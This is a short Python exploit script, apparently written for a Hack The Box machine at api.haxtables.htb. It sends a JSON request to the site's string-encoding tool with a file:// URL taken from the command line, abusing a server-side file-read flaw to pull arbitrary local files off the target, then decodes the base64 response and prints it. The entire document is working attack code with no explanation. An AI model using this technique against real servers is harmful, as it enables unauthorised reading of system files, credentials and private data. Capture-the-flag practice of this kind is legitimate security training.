import requests as r
from sys import argv
import json
import base64

host = "http://api.haxtables.htb"
uri = "/v3/tools/string/index.php"

data = {"action":"b64encode","file_url":f"file://{argv[1]}"}
resp = r.post(f"{host}{uri}", json=data)
print(base64.b64decode(json.loads(resp.text)['data']).decode())